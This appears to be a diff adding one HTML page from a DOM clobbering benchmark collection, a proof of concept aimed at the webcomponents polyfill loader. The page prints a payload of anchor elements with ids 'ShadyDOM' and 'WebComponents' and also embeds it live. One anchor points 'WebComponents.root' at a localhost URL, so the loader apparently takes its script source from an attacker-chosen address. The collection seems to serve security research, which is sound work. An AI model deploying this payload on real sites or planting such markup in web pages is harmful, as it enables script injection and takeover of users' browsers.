@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - polyfills</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;a id=&quot;ShadyDOM&quot;&gt;&lt;/a&gt;
+&lt;a id=&quot;ShadyDOM&quot; name=&quot;force&quot;&gt;&lt;/a&gt;
+&lt;a id=&quot;WebComponents&quot;&gt;&lt;/a&gt;
+&lt;a id=&quot;WebComponents&quot; name=&quot;root&quot; href=&quot;http://localhost:9999&quot;&gt;&lt;/a&gt;</pre>
+  <a id="ShadyDOM"></a>
+<a id="ShadyDOM" name="force"></a>
+<a id="WebComponents"></a>
+<a id="WebComponents" name="root" href="http://localhost:9999"></a>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script src=&quot;./webcomponents-loader.js&quot;&gt;&lt;/script&gt;</pre>
+  <script src="./webcomponents-loader.js"></script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../prism/poc.html">Next: prism</a>
+  </div>
+</section>
+
+</body>
+</html>
